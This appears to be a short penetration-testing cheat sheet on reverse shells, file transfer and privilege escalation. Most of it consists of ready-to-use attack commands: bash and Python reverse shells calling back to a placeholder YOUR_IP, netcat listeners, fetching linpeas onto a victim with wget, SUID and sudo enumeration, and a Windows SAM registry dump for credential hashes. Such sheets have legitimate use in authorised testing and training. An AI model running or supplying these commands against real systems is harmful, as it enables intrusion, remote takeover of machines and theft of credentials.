# 🐚 Privilege Escalation & Shells

## 🔌 Reverse Shells
*Connect back to your machine.*

**1. Start Listener (Your Machine):**
```bash
nc -lvnp 4444
```

**2. Execute Payload (Victim Machine):**
* **Bash:** `bash -i >& /dev/tcp/YOUR_IP/4444 0>&1`
* **Python:** `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

---

## 📥 File Transfer
*Getting scripts (like linpeas) onto the target.*

**Method A: Python Server**
1.  **Attacker:** `python3 -m http.server 8000`
2.  **Victim:** `wget http://YOUR_IP:8000/linpeas.sh`

**Method B: Netcat**
1.  **Victim (Receiver):** `nc -l -p 1234 > file.out`
2.  **Attacker (Sender):** `nc <victim_ip> 1234 < file.in`

---

## 🚀 Linux PrivEsc
* **Check Sudo Rights:** `sudo -l` (Look for NOPASSWD).
* **Check SUID Binaries:** `find / -perm -u=s -type f 2>/dev/null`
* **GTFOBins:** Search [GTFOBins](https://gtfobins.github.io/) for binaries found above.

## 🪟 Windows PrivEsc
* **System Info:** `systeminfo`
* **Who am I:** `whoami /priv`
* **SAM Dump:** `reg save hklm\sam sam.hive` (If you have access).